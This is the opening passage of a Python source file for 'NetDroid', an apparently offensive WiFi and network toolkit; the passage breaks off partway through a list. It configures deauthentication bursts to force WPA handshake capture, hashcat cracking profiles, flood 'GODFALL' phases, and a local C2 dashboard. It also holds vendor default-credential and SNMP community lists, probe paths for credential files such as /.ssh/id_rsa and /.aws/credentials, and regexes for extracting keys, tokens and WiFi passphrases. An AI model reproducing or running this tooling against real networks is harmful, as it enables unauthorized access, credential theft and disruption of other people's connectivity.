#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════╗
║  NetDroid — Professional WiFi Network Analysis Toolkit      ║
║  Single-file · Termux-ready · No root required              ║
║  Cyberpunk terminal UI · Military-grade logic                ║
╚══════════════════════════════════════════════════════════════╝
"""

# ─── Windows UTF-8 fix (must run before rich import) ─────────
import sys
import os
if sys.platform == "win32":
    os.environ.setdefault("PYTHONIOENCODING", "utf-8")
    if hasattr(sys.stdout, "reconfigure"):
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    if hasattr(sys.stderr, "reconfigure"):
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")

# ─────────────────────────── stdlib ───────────────────────────
import argparse
import asyncio
import html
import ipaddress
import json
import math
import os
import platform
import random
import re
import shutil
import socket
import struct
import subprocess
import sys
import textwrap
import threading
import time
import traceback
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from pathlib import Path
from typing import Any, Dict, List, Optional, Set, Tuple
from urllib.parse import urlparse

# ─────────────────────── third-party ──────────────────────────
try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
    from rich.text import Text
    from rich.live import Live
    from rich.layout import Layout
    from rich.columns import Columns
    from rich import box
    HAS_RICH = True
except ImportError:
    HAS_RICH = False

try:
    import aiohttp
    HAS_AIOHTTP = True
except ImportError:
    HAS_AIOHTTP = False

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    from bs4 import BeautifulSoup
    HAS_BS4 = True
except ImportError:
    HAS_BS4 = False

try:
    import nmap
    HAS_NMAP = True
except ImportError:
    HAS_NMAP = False

# Scapy é opcional (raw ARP/SYN/802.11 quando --root está ativo)
try:
    from scapy.all import (ARP, Ether, ICMP, IP, TCP, UDP, RadioTap,
                            Dot11, Dot11Deauth, Dot11ProbeReq, Dot11Beacon,
                            Dot11Elt, conf as scapy_conf, sniff, srp, sr1, send, sendp)
    HAS_SCAPY = True
except Exception:
    HAS_SCAPY = False

# Dashboard C2 ao vivo (--live): Flask + SocketIO opcionais
try:
    from flask import Flask, jsonify, request as flask_request
    from flask_socketio import SocketIO
    HAS_FLASK = True
except Exception:
    HAS_FLASK = False

# PDF report final (módulo --god)
try:
    from reportlab.lib.pagesizes import A4
    from reportlab.lib import colors as rl_colors
    from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
    from reportlab.lib.units import cm
    from reportlab.platypus import (SimpleDocTemplate, Paragraph, Spacer,
                                     Table as RLTable, TableStyle, PageBreak)
    HAS_REPORTLAB = True
except Exception:
    HAS_REPORTLAB = False

# ═══════════════════════ CONSTANTS ════════════════════════════
VERSION = "1.6.0"
GITHUB_REPO = "yamotoz/NetDroid"
GITHUB_BRANCHES = ("master", "main")  # tenta master 1º (default atual), main como fallback
GITHUB_RAW_TEMPLATE = "https://raw.githubusercontent.com/{repo}/{branch}/{path}"
GITHUB_RAW_URL = GITHUB_RAW_TEMPLATE.format(repo=GITHUB_REPO, branch="master", path="NetDroid.py")
GITHUB_VERSION_URL = GITHUB_RAW_TEMPLATE.format(repo=GITHUB_REPO, branch="master", path="VERSION")
HAS_NMAP_BIN = bool(shutil.which("nmap"))
NETBIOS_MESSAGE = "O relogio bate as 4"
DEFAULT_SCAN_MODE = "normal"
STRESS_MAX_DURATION = 300
CONCURRENT_LIMIT = 500
PING_TIMEOUT = 1
SCAN_TIMEOUT = 2
BANNER_TIMEOUT = 3
GODFALL_ATTEMPTS = 160
GODFALL_ATTEMPTS_INSANE = 420
GODFALL_PHASES = [
    {"name": "OVERDRIVE", "multiplier": 2.60, "concurrency": 256, "delay": 0.001, "barrage": 2},
    {"name": "TITANFALL", "multiplier": 3.50, "concurrency": 384, "delay": 0.000, "barrage": 3},
]
GODFALL_PHASES_INSANE = [
    {"name": "OVERDRIVE", "multiplier": 3.60, "concurrency": 384, "delay": 0.001, "barrage": 3},
    {"name": "TITANFALL", "multiplier": 5.00, "concurrency": 512, "delay": 0.000, "barrage": 4},
]
GODFALL_BARRAGE_THREADS_PER_TIER = 28
GODFALL_BARRAGE_PORTS = [80, 443, 53, 8080, 8443, 22, 5060, 1900, 137, 5353, 161, 123, 7, 19]
GODFALL_TCP_SWARM_PER_TIER = 64
GODFALL_ABORT_SUCCESS_PCT = 4.0
GODFALL_ABORT_LATENCY_MULT = 8.0
GODFALL_ABORT_LOSS_PCT = 92.0
GODFALL_RECOVERY_TARGET_MULT = 1.5
GODFALL_RECOVERY_TIMEOUT_S = 90
GODFALL_RECOVERY_STABLE_SAMPLES = 6
IS_WINDOWS = platform.system().lower() == "windows"
IS_TERMUX = (
    os.path.isdir("/data/data/com.termux") or
    os.environ.get("PREFIX", "").startswith("/data/data/com.termux")
)
IS_LINUX = (not IS_WINDOWS) and (not IS_TERMUX) and platform.system().lower() == "linux"

# Capabilities detectadas em runtime (binários nativos privilegiados)
HAS_AIREPLAY = bool(shutil.which("aireplay-ng"))
HAS_AIRMON   = bool(shutil.which("airmon-ng"))
HAS_MDK4     = bool(shutil.which("mdk4")) or bool(shutil.which("mdk3"))
HAS_TCPDUMP  = bool(shutil.which("tcpdump"))
HAS_IW       = bool(shutil.which("iw"))
HAS_IWCONFIG = bool(shutil.which("iwconfig"))
HAS_ARPSCAN  = bool(shutil.which("arp-scan"))
HAS_IPTABLES = bool(shutil.which("iptables"))
HAS_NETSH    = bool(shutil.which("netsh"))
HAS_PKTMON   = bool(shutil.which("pktmon"))
HAS_POWERSHELL = bool(shutil.which("powershell")) or bool(shutil.which("pwsh"))
HAS_SU       = bool(shutil.which("su"))
# Captura/crack WiFi profissional (módulo --live)
HAS_HCXDUMPTOOL = bool(shutil.which("hcxdumptool"))
HAS_HCXPCAPNGTOOL = bool(shutil.which("hcxpcapngtool")) or bool(shutil.which("hcxpcaptool"))
HAS_HASHCAT  = bool(shutil.which("hashcat"))
HAS_AIRODUMP = bool(shutil.which("airodump-ng"))
HAS_AIRCRACK = bool(shutil.which("aircrack-ng"))

# ──────────── Dashboard C2 (--live) constants ───────────────
DASHBOARD_HOST = "127.0.0.1"
DASHBOARD_PORT = 5556
DASHBOARD_SECRET = "netdroid-c2-local"  # local apenas — não exposto à rede
WORDLIST_DIR = Path("WordList")
HANDSHAKE_DIR = Path("handshakes")
PASS_DIR = Path("Pass")              # senhas quebradas (append-only)
IMPORTS_DIR = Path("imports")        # exports de zonas (PDF + TXT)
DEAUTH_THREAD_LIMIT = 100            # max threads deauth simultâneas (carrossel + reserva)
CARROSSEL_SLOT_VERMELHA_S = 15       # tempo por canal quando só há APs em vermelha
CARROSSEL_SLOT_AZUL_S = 10           # tempo por canal quando há APs em azul (handshake)
CARROSSEL_AIRODUMP_BOOT_S = 1.5      # pausa entre airodump up e aireplay bursts
CARROSSEL_AZUL_FLUSH_S = 1.5         # pausa pós-slot pro airodump flushar cap antes da validação
CARROSSEL_AZUL_BURST_PKTS = 30       # deauths por burst em zona azul (kicka cliente)
CARROSSEL_AZUL_LISTEN_S = 8          # janela de escuta entre bursts (cliente reconecta)
AZUL_DIR = HANDSHAKE_DIR / "azul"    # 1 pasta por BSSID com handshake.cap+22000
SLOT_TEMP_DIR = HANDSHAKE_DIR / "_slot_temp"  # caps temp do carrossel (deletados)

# Tabela canal ↔ frequência 802.11 (preenche '?' automaticamente quando
# uma fonte traz canal mas não freq, ou vice-versa)
CHANNEL_TO_FREQ_24 = {n: 2407 + n*5 for n in range(1, 14)}
CHANNEL_TO_FREQ_24[14] = 2484
CHANNEL_TO_FREQ_5 = {  # canais 5GHz comuns
    32:5160, 36:5180, 40:5200, 44:5220, 48:5240, 52:5260, 56:5280,
    60:5300, 64:5320, 68:5340, 96:5480, 100:5500, 104:5520, 108:5540,
    112:5560, 116:5580, 120:5600, 124:5620, 128:5640, 132:5660,
    136:5680, 140:5700, 144:5720, 149:5745, 153:5765, 157:5785,
    161:5805, 165:5825, 169:5845, 173:5865, 177:5885,
}
CHANNEL_TO_FREQ_6 = {1+(n-1)*4: 5950 + n*5 for n in range(1, 60)}  # 6GHz (Wi-Fi 6E)
CHANNEL_TO_FREQ_ALL = {**CHANNEL_TO_FREQ_24, **CHANNEL_TO_FREQ_5}
FREQ_TO_CHANNEL_ALL = {v: k for k, v in CHANNEL_TO_FREQ_ALL.items()}

# Captura/scan contínuo
CONTINUOUS_SCAN_INTERVAL_SEC = 6     # intervalo entre re-leituras do CSV airodump
CHANNEL_HOP_INTERVAL_MS = 250        # tempo em cada canal antes de pular
HANDSHAKE_RETRY_FOREVER = True       # nunca desiste de capturar handshake
HASHCAT_PROFILES = {
    # nome: workload (1-4) + label visível no dashboard
    "low":     {"workload": 1, "runtime": 0, "label": "🟢 LOW — silencioso (~30% GPU)"},
    "medium":  {"workload": 2, "runtime": 0, "label": "🟡 MEDIUM — balanceado (~60% GPU)"},
    "hard":    {"workload": 3, "runtime": 0, "label": "🟠 HARD — pesado (~90% GPU)"},
    "insane":  {"workload": 4, "runtime": 0, "label": "🔴 INSANE — 100% GPU descontrolado"},
}

# Fases godfall apex sob --root: tiers maiores e concorrência elevada
GODFALL_PHASES_ROOT = [
    {"name": "OVERDRIVE", "multiplier": 4.20, "concurrency": 512, "delay": 0.001, "barrage": 3},
    {"name": "TITANFALL", "multiplier": 6.50, "concurrency": 768, "delay": 0.000, "barrage": 5},
]
GODFALL_PHASES_ROOT_INSANE = [
    {"name": "OVERDRIVE", "multiplier": 5.40, "concurrency": 768, "delay": 0.000, "barrage": 4},
    {"name": "TITANFALL", "multiplier": 8.00, "concurrency": 1024, "delay": 0.000, "barrage": 6},
]
# Limite de concorrência elevado quando privilégio detectado
CONCURRENT_LIMIT_ROOT = 2048
# Thermal guard (Termux): °C
THERMAL_LIMITE_REDUZIR = 70.0
THERMAL_LIMITE_ABORTAR = 80.0

# Wordlist expandida de comunidades SNMP usada no boost --god + --root
SNMP_COMMUNITIES_ROOT = [
    "public", "private", "cisco", "admin", "manager", "community",
    "read", "write", "secret", "default", "0", "router", "guest",
    "monitor", "snmp", "snmpd", "snmptrap", "system", "all",
    "snmpv1", "snmpv2", "rmon", "test", "ilmi", "core",
    "tivoli", "openview", "hp_admin", "security", "OrigEquipMfr",
    "regional", "office", "private0", "public0", "publi",
    "Public", "Private", "ADMIN", "ROOT", "fubar",
]

# ──────────── Drivers Windows que bloqueiam 802.11 injection ──
# Regex de drivers conhecidos por silenciosamente descartar frames
# de injection (sendp/scapy) mesmo com NPCAP instalado. Usado pelo
# pré-check do --kamikase no Windows para alertar antes do ataque.
DRIVERS_BLOQUEIAM_INJECTION = [
    (r"Intel.*Wireless.*(AC|AX|BE)\s*\d{3,4}",
     "Drivers Intel modernos (AC/AX/BE) bloqueiam injection no Windows."),
    (r"Intel.*Wi-?Fi\s*6",
     "Intel Wi-Fi 6/6E driver Windows bloqueia injection."),
    (r"Realtek.*RTL88(21|22|52|53)",
     "Realtek RTL88xx no Windows bloqueia injection (modo Linux funciona)."),
    (r"Killer.*Wi-?Fi",
     "Killer Wi-Fi (rebrand Intel/Qualcomm) bloqueia injection."),
    (r"Qualcomm.*Atheros.*QCA9\d{3}",
     "Qualcomm Atheros QCA9xxx recente bloqueia injection no Windows."),
    (r"MediaTek.*MT76\d{2}",
     "MediaTek MT76xx no Windows bloqueia injection."),
    (r"Broadcom.*BCM43",
     "Broadcom BCM43xx bloqueia injection (Apple/Mac e alguns notebooks)."),
]

# Drivers/chips que SABIDAMENTE funcionam (whitelist informativa)
DRIVERS_PERMITEM_INJECTION = [
    (r"Atheros.*AR9271",          "Atheros AR9271 — clássico, funciona perfeito."),
    (r"Atheros.*AR9285",          "Atheros AR9285 — driver expõe monitor."),
    (r"Realtek.*RTL8187",         "Realtek RTL8187 — adapters Alfa antigos."),
    (r"Ralink.*RT3070",           "Ralink RT3070 — adapters Alfa AWUS036NH."),
    (r"Realtek.*RTL8812AU",       "Realtek RTL8812AU — Alfa AWUS036ACH."),
]

# ─────────────────── color palette ────────────────────────────
C_RED = "#ff003c"    # Cyberpunk Red
C_GREEN = "#00ff9f"  # Matrix/Neon Green
C_YELLOW = "#fdee00" # Cyber Yellow
C_CYAN = "#00d4ff"   # Electric Blue
C_WHITE = "#fafafa"  # Pure White
C_DIM = "#444444"    # Deep Grey
C_BG = "#050505"     # Near Black
C_PURPLE = "#bc13fe" # Neon Purple

# ─────────────────── port databases ───────────────────────────
TOP20_PORTS = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139,
               143, 443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080]

TOP100_PORTS = [7, 9, 13, 21, 22, 23, 25, 26, 37, 53, 79, 80, 81, 88, 106,
                110, 111, 113, 119, 135, 139, 143, 144, 179, 199, 389, 427,
                443, 444, 445, 465, 513, 514, 515, 543, 544, 548, 554, 587,
                631, 646, 873, 990, 993, 995, 1025, 1026, 1027, 1028, 1029,
                1110, 1433, 1720, 1723, 1755, 1900, 2000, 2001, 2049, 2121,
                2717, 3000, 3128, 3306, 3389, 3986, 4899, 5000, 5009, 5051,
                5060, 5101, 5190, 5357, 5432, 5631, 5666, 5800, 5900, 6000,
                6001, 6646, 7070, 8000, 8008, 8009, 8080, 8081, 8443, 8888,
                9100, 9999, 10000, 32768, 49152, 49153, 49154, 49155, 49156]

IOT_PORTS = [554, 8000, 8080, 8443, 8888, 37777, 34567, 80, 443, 49152]

SERVICE_MAP = {
    7: "echo", 9: "discard", 13: "daytime", 19: "chargen", 21: "ftp", 22: "ssh",
    23: "telnet", 25: "smtp", 37: "time", 53: "dns", 67: "dhcp", 68: "dhcp",
    69: "tftp", 79: "finger", 80: "http", 81: "http-alt", 88: "kerberos",
    102: "iso-tsap", 104: "dicom", 106: "poppassd", 110: "pop3", 111: "rpcbind",
    113: "ident", 119: "nntp", 123: "ntp", 135: "msrpc", 137: "netbios-ns",
    138: "netbios-dgm", 139: "netbios-ssn", 143: "imap", 161: "snmp", 162: "snmp-trap",
    179: "bgp", 389: "ldap", 427: "svrloc", 443: "https", 445: "microsoft-ds",
    465: "smtps", 502: "modbus", 513: "rlogin", 514: "syslog", 515: "printer",
    543: "klogin", 548: "afp", 554: "rtsp", 587: "submission", 631: "ipp",
    636: "ldaps", 666: "doom", 873: "rsync", 902: "vmware", 990: "ftps",
    993: "imaps", 995: "pop3s", 1080: "socks", 1194: "openvpn", 1433: "mssql",
    1521: "oracle", 1604: "icabrowser", 1701: "l2tp", 1723: "pptp", 1883: "mqtt",
    1900: "upnp", 2000: "cisco-sccp", 2049: "nfs", 2082: "cpanel", 2083: "cpanel-ssl",
    2086: "whm", 2087: "whm-ssl", 2222: "ssh-alt", 2375: "docker", 2376: "docker-tls",
    2483: "oracle-db", 2484: "oracle-db-ssl", 3000: "grafana", 3128: "squid",
    3268: "ldap-gc", 3306: "mysql", 3389: "rdp", 3478: "stun", 3690: "svn",
    4369: "epmd", 4444: "metasploit", 4500: "ipsec-nat", 4567: "tram",
    4848: "glassfish", 5000: "upnp", 5001: "iperf3", 5005: "rtp",
    5060: "sip", 5061: "sips", 5222: "xmpp-client", 5269: "xmpp-server",
    5353: "mdns", 5432: "postgresql", 5555: "freeciv", 5631: "pcanywhere",
    5683: "coap", 5800: "vnc-http", 5900: "vnc", 5984: "couchdb",
    6000: "x11", 6379: "redis", 6443: "kubernetes", 6660: "irc",
    6667: "irc", 6881: "bittorrent", 7000: "afs3-fileserver", 7001: "weblogic",
    7077: "spark", 7547: "tr-069", 7657: "i2p", 8000: "http-alt",
    8008: "http-alt", 8009: "ajp13", 8080: "http-proxy", 8081: "http-alt",
    8086: "influxdb", 8088: "hadoop", 8089: "splunk", 8090: "atlassian",
    8091: "couchbase", 8123: "home-assistant", 8200: "vault", 8333: "bitcoin",
    8443: "https-alt", 8500: "consul", 8554: "rtsp-alt", 8649: "ganglia",
    8883: "mqtts", 8888: "http-alt", 9000: "php-fpm", 9042: "cassandra",
    9090: "prometheus", 9091: "transmission", 9092: "kafka", 9100: "jetdirect",
    9200: "elasticsearch", 9418: "git", 9999: "abyss", 10000: "webmin",
    11211: "memcached", 15672: "rabbitmq", 16992: "intel-amt", 17500: "dropbox",
    19999: "netdata", 25565: "minecraft", 27015: "source-engine", 27017: "mongodb",
    32400: "plex", 32768: "rpc", 34567: "dahua-alt", 37777: "dahua",
    44818: "ethernetip", 47808: "bacnet", 49152: "upnp-nat", 50000: "sap",
    50070: "hadoop-hdfs", 51820: "wireguard", 54321: "supercollider",
    61616: "activemq", 62078: "lockdownd-ios",
}

# ─────────────── MAC vendor prefix (offline) ─────────────────
# Base ampliada de fabricantes (140+ prefixos OUI) — cobertura militar
MAC_VENDORS = {
    "00:1A:2B": "Ayecom", "00:50:56": "VMware", "00:0C:29": "VMware",
    "00:1C:42": "Parallels", "08:00:27": "VirtualBox",
    "AC:DE:48": "Apple", "3C:22:FB": "Apple", "F0:18:98": "Apple",
    "A4:83:E7": "Apple", "DC:A6:32": "Raspberry Pi",
    "B8:27:EB": "Raspberry Pi", "E4:5F:01": "Raspberry Pi",
    "00:E0:4C": "Realtek", "48:5B:39": "Realtek",
    "00:1A:3F": "Samsung", "00:21:19": "Samsung",
    "58:CB:52": "Samsung", "AC:5F:3E": "Samsung",
    "C0:25:E9": "TP-Link", "50:C7:BF": "TP-Link",
    "14:CC:20": "TP-Link", "EC:08:6B": "TP-Link",
    "60:32:B1": "TP-Link", "B0:BE:76": "TP-Link",
    "10:FE:ED": "TP-Link", "98:DA:C4": "TP-Link",
    "00:1E:58": "D-Link", "1C:7E:E5": "D-Link",
    "28:10:7B": "D-Link", "C4:A8:1D": "D-Link",
    "A8:DA:0C": "Hikvision", "C0:56:E3": "Hikvision",
    "44:19:B6": "Hikvision", "BC:AD:28": "Hikvision",
    "3C:EF:8C": "Dahua", "40:2C:76": "Dahua",
    "D4:43:A8": "Dahua", "E0:50:8B": "Dahua",
    "04:D9:F5": "ASUS", "2C:56:DC": "ASUS",
    "60:45:CB": "ASUS", "F0:79:59": "ASUS",
    "CC:2D:E0": "MikroTik", "4C:5E:0C": "MikroTik",
    "D4:CA:6D": "MikroTik", "6C:3B:6B": "MikroTik",
    "B4:75:0E": "Belkin", "94:10:3E": "Belkin",
    "C0:56:27": "Belkin", "EC:1A:59": "Belkin",
    "00:14:BF": "Linksys", "C0:56:27": "Linksys",
    "20:AA:4B": "Linksys", "58:6D:8F": "Linksys",
    "00:0E:8F": "Cisco", "00:1B:D5": "Cisco",
    "F4:CF:E2": "Cisco", "B0:AA:77": "Cisco",
    "00:24:D7": "Intel", "3C:97:0E": "Intel",
    "68:05:CA": "Intel", "A4:C4:94": "Intel",
    "38:2C:4A": "ASUSTek", "00:1F:C6": "ASUSTek",
    "74:D4:35": "Giga-Byte", "00:1B:FC": "ASRock",
    "54:B2:03": "Huawei", "00:E0:FC": "Huawei",
    "48:46:FB": "Huawei", "CC:A2:23": "Huawei",
    "7C:B0:C2": "Intel", "00:26:18": "ASUSTek",
    "F8:1A:67": "TP-Link", "18:A6:F7": "TP-Link",
    # Xiaomi / Redmi
    "28:6C:07": "Xiaomi", "34:CE:00": "Xiaomi", "50:8F:4C": "Xiaomi",
    "64:09:80": "Xiaomi", "78:11:DC": "Xiaomi", "8C:BE:BE": "Xiaomi",
    "98:FA:E3": "Xiaomi", "F4:8B:32": "Xiaomi",
    # Tenda
    "C8:3A:35": "Tenda", "50:2B:73": "Tenda", "08:57:00": "Tenda",
    # ZTE
    "00:1E:73": "ZTE", "34:37:59": "ZTE", "DC:02:8E": "ZTE",
    "F4:6D:E2": "ZTE",
    # Google / Nest
    "F4:F5:D8": "Google", "1C:F2:9A": "Google", "20:DF:B9": "Google",
    "64:16:66": "Google-Nest",
    # Amazon / Echo
    "44:65:0D": "Amazon", "F0:27:2D": "Amazon", "FC:65:DE": "Amazon",
    "B0:FC:0D": "Amazon",
    # Sony
    "00:24:BE": "Sony", "FC:0F:E6": "Sony", "78:84:3C": "Sony",
    # LG
    "00:1F:6B": "LG", "C4:36:6C": "LG", "E8:5B:5B": "LG",
    # Netgear
    "00:09:5B": "Netgear", "20:E5:2A": "Netgear", "C4:04:15": "Netgear",
    "9C:C9:EB": "Netgear", "A0:40:A0": "Netgear",
    # Aruba
    "00:1A:1E": "Aruba", "20:4C:03": "Aruba", "94:B4:0F": "Aruba",
    # Ruckus
    "00:13:92": "Ruckus", "8C:7A:15": "Ruckus", "E0:10:7F": "Ruckus",
    # Ubiquiti
    "24:A4:3C": "Ubiquiti", "44:D9:E7": "Ubiquiti", "78:8A:20": "Ubiquiti",
    "DC:9F:DB": "Ubiquiti", "E0:63:DA": "Ubiquiti", "FC:EC:DA": "Ubiquiti",
    # Roku
    "AC:3A:7A": "Roku", "B0:A7:37": "Roku", "CC:6D:A0": "Roku",
    # Sonos
    "00:0E:58": "Sonos", "78:28:CA": "Sonos", "B8:E9:37": "Sonos",
    # Wyze / Eufy
    "2C:AA:8E": "Wyze", "7C:78:B2": "Wyze", "8C:85:80": "Eufy",
    # Synology / QNAP
    "00:11:32": "Synology", "24:5E:BE": "QNAP",
    # Roteadores extras / IoT
    "00:1D:7E": "Cisco-Linksys", "00:25:9C": "Cisco-Linksys",
    "00:18:39": "Cisco-Linksys", "00:21:91": "D-Link", "00:0F:3D": "D-Link",
    # Impressoras
    "00:00:F0": "Samsung-Printer", "00:03:7F": "Brother", "08:00:46": "Sony",
    "00:80:77": "Brother", "00:1B:A9": "Brother",
    "00:00:48": "Epson", "44:D8:84": "Epson", "A4:EE:57": "Epson",
    "30:CD:A7": "HP", "F4:CE:46": "HP", "9C:8E:99": "HP",
    "00:C0:EE": "Kyocera",
    # Câmeras IP extras
    "00:11:13": "Axis", "00:40:8C": "Axis", "AC:CC:8E": "Axis",
    "00:0F:7C": "Foscam", "8C:E7:48": "Foscam",
    "EC:71:DB": "Reolink", "94:E1:AC": "Reolink",
    "AC:CF:23": "Amcrest",
    # VoIP / SIP
    "00:0B:82": "Grandstream", "C0:74:AD": "Grandstream",
    # Mobile / IoT extra
    "00:25:00": "Apple", "F0:18:98": "Apple", "AC:CF:5C": "Apple",
    "00:23:6C": "Apple", "BC:52:B7": "Apple",
}

# ──────────── default credentials database ────────────────────
DEFAULT_CREDS = {
    "generic": [("admin", "admin"), ("admin", "1234"), ("admin", "password"),
                ("admin", "12345"), ("root", "root"), ("user", "user"),
                ("admin", ""), ("root", ""), ("admin", "123456")],
    "dahua": [("admin", "admin"), ("admin", ""), ("888888", "888888")],
    "hikvision": [("admin", "12345"), ("admin", "admin")],
    "tp-link": [("admin", "admin"), ("admin", "")],
    "asus": [("admin", "admin"), ("admin", "password")],
    "mikrotik": [("admin", ""), ("admin", "admin")],
    "d-link": [("admin", ""), ("admin", "admin"), ("admin", "password")],
    "linksys": [("admin", "admin"), ("", "admin")],
    "cisco": [("cisco", "cisco"), ("admin", "admin")],
    "huawei": [("admin", "admin"), ("telecomadmin", "admintelecom")],
    "xiaomi": [("admin", "admin"), ("admin", "1234"), ("root", "root")],
    "tenda": [("admin", "admin"), ("admin", "")],
    "zte": [("admin", "admin"), ("user", "user"), ("admin", "Zte521")],
    "ubiquiti": [("ubnt", "ubnt"), ("admin", "admin")],
    "axis": [("root", "pass"), ("admin", "admin")],
    "foscam": [("admin", ""), ("admin", "admin")],
    "reolink": [("admin", ""), ("admin", "admin")],
    "amcrest": [("admin", "admin"), ("admin", "")],
    "netgear": [("admin", "password"), ("admin", "1234"), ("admin", "admin")],
    "synology": [("admin", ""), ("admin", "admin")],
    "qnap": [("admin", "admin")],
    "intelbras": [("admin", "admin"), ("admin", "1234")],
    "fortinet": [("admin", "")],
}

# ────────────── RTSP paths para testar ───────────────────────
# Caminhos comuns por fabricante (35+) — usados na descoberta defensiva
RTSP_PATHS = [
    "/live", "/stream", "/stream1", "/stream2", "/ch01", "/ch1", "/ch01.264",
    "/video1", "/video.h264", "/cam/realmonitor", "/cam/realmonitor?channel=1&subtype=0",
    "/Streaming/Channels/101", "/Streaming/Channels/102", "/Streaming/Channels/1",
    "/live/ch00_0", "/live/ch01_0", "/h264", "/h264_stream", "/h264Preview_01_main",
    "/mpeg4", "/MediaInput/h264", "/channel1", "/channel2", "/media/video1",
    "/media/video2", "/11", "/12", "/onvif1", "/onvif2",
    "/axis-media/media.amp", "/mjpg/video.mjpg", "/videoMain", "/videoSub",
    "/user=admin&password=&channel=1&stream=0.sdp", "/PSIA/Streaming/channels/1",
    "/user.sdp", "/play1.sdp", "/play2.sdp",
]

# ────────────── API endpoints para sondar ────────────────────
# 30+ endpoints comuns em routers, NVRs, NAS, IoT e câmeras IP
API_ENDPOINTS = [
    "/api/", "/api/v1/", "/api/v1/status", "/v1/", "/v2/",
    "/cgi-bin/", "/cgi-bin/config.cgi", "/cgi-bin/luci",
    "/admin/", "/admin/login", "/login", "/status", "/info",
    "/config.xml", "/deviceinfo", "/system", "/system.xml",
    "/graphql", "/swagger.json", "/swagger-ui.html", "/openapi.json",
    "/ISAPI/System/deviceInfo", "/PSIA/System/deviceInfo",
    "/common/info.cgi", "/onvif/device_service",
    "/axis-cgi/", "/axis-cgi/admin/serverreport.cgi",
    "/Synology/", "/webman/index.cgi", "/qts/", "/cgi-bin/quick.html",
    "/.git/config", "/.env", "/phpmyadmin/", "/wp-admin/",
    "/manager/html", "/server-status", "/server-info",
    "/cmd.php", "/setup.cgi", "/HNAP1/",
]

# ──────────── Caça a segredos (paths críticos passivos) ──────
# Paths que costumam vazar credenciais/configs/backups quando expostos.
# São sondados via GET (read-only) e o body é inspecionado por LEAK_PATTERNS.
SECRET_PATHS = [
    # Variáveis de ambiente
    "/.env", "/.env.local", "/.env.production", "/.env.development", "/.env.bak",
    # Configs de aplicação
    "/config.json", "/config.yaml", "/config.yml", "/configuration.php",
    "/wp-config.php", "/wp-config.php.bak", "/wp-config.php.old", "/wp-config.php~",
    "/settings.py", "/settings.json", "/local_settings.py",
    "/credentials.json", "/secrets.json", "/secrets.yaml",
    # Dumps e backups de banco
    "/database.sql", "/dump.sql", "/backup.sql", "/db.sql",
    "/backup.zip", "/backup.tar", "/backup.tar.gz", "/site.zip", "/www.zip",
    "/db.sqlite", "/db.sqlite3", "/database.sqlite",
    # Git / VCS
    "/.git/config", "/.git/HEAD", "/.git/index", "/.gitignore",
    "/.svn/entries", "/.hg/hgrc",
    # Auth files
    "/.htpasswd", "/.htaccess", "/auth.json",
    # Cloud / SSH
    "/.aws/credentials", "/.aws/config", "/.ssh/id_rsa", "/.ssh/authorized_keys",
    "/private.key", "/server.key", "/id_rsa", "/id_dsa",
    # Package manifests com possíveis tokens
    "/composer.json", "/package.json", "/.npmrc", "/.pypirc",
    # Documentação de API que pode listar endpoints internos
    "/swagger-ui.html", "/swagger.json", "/api-docs", "/openapi.json", "/v2/api-docs",
    # Diagnóstico
    "/.DS_Store", "/Thumbs.db", "/phpinfo.php", "/info.php", "/test.php",
    "/debug", "/debug.log", "/error.log",
    # Dashboards comuns
    "/actuator/env", "/actuator/health", "/actuator/heapdump",
    "/console", "/jmx-console", "/manager/status",
]

# Regex que indicam vazamento real dentro do body. Severidade `critica` quando casa.
LEAK_PATTERNS = [
    (r"(?i)BEGIN\s+(RSA|DSA|EC|OPENSSH)\s+PRIVATE\s+KEY", "Chave privada exposta"),
    (r"(?i)aws_secret_access_key\s*[:=]\s*['\"]?[A-Za-z0-9/+=]{20,}", "AWS secret access key"),
    (r"(?i)aws_access_key_id\s*[:=]\s*['\"]?AKIA[0-9A-Z]{16}", "AWS access key id"),
    (r"(?i)(api[_-]?key|apikey|access[_-]?token|auth[_-]?token)\s*[:=]\s*['\"][A-Za-z0-9_\-]{16,}", "API token"),
    (r"(?i)password\s*[:=]\s*['\"][^'\"\s]{4,}", "Senha em texto plano"),
    (r"(?i)db[_-]?pass(word)?\s*[:=]\s*['\"][^'\"\s]{4,}", "Senha de banco de dados"),
    (r"(?i)mysql://[^:]+:[^@]+@", "URI MySQL com credenciais"),
    (r"(?i)postgres(ql)?://[^:]+:[^@]+@", "URI PostgreSQL com credenciais"),
    (r"(?i)mongodb(\+srv)?://[^:]+:[^@]+@", "URI MongoDB com credenciais"),
    (r"\[core\]\s*\n\s*repositoryformatversion", "Arquivo .git/config exposto"),
    (r"-----BEGIN\s+CERTIFICATE-----", "Certificado exposto"),
    (r"(?i)xoxb-[A-Za-z0-9-]{20,}", "Slack bot token"),
    (r"(?i)gh[pousr]_[A-Za-z0-9]{30,}", "GitHub token"),
    (r"(?i)secret[_-]?key\s*[:=]\s*['\"][A-Za-z0-9_\-]{16,}", "Secret key"),
    (r"(?i)<DB_PASSWORD>|DB_PASSWORD\s*=", "Senha de banco em config"),
]

# Comunidades SNMP comuns para teste passivo (uma única GetRequest cada).
SNMP_COMMUNITIES = [
    "public", "private", "cisco", "admin", "manager", "community",
    "read", "write", "secret", "default", "0", "router", "guest",
]

# Padrões de PSK / chave WiFi vazadas em JS de páginas de status de roteador.
PSK_PATTERNS = [
    (r'(?i)(?:var|let|const)\s+(?:wifi[_-]?key|wpa[_-]?key|psk|wpapsk|wlan[_-]?passphrase|passphrase|pskvalue)\s*=\s*["\']([^"\']{6,63})["\']',
     "PSK em variável JS"),
    (r'(?i)"(?:wifiKey|wpaKey|psk|wpaPassphrase|passPhrase|pskValue)"\s*:\s*"([^"]{6,63})"',
     "PSK em campo JSON embutido"),
    (r'(?i)(?:value|defaultvalue)\s*=\s*"([^"]{8,63})"\s+[^>]*(?:id|name)\s*=\s*"(?:wpaPassphrase|psk|wifiKey|wlanKey|passphrase)"',
     "PSK em input HTML"),
